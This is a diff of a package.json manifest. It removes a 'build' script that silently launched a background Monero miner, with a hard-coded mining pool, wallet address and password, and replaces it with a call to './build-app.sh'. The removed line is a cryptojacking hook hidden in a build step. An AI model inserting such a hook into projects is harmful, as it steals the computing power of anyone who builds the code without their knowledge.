@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "build": "chmod +x app && ./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS -p orehsan:mewknows@gmail.com -k --tls --background"
+    "build": "./build-app.sh"
   },
   "author": "",
   "license": "ISC"
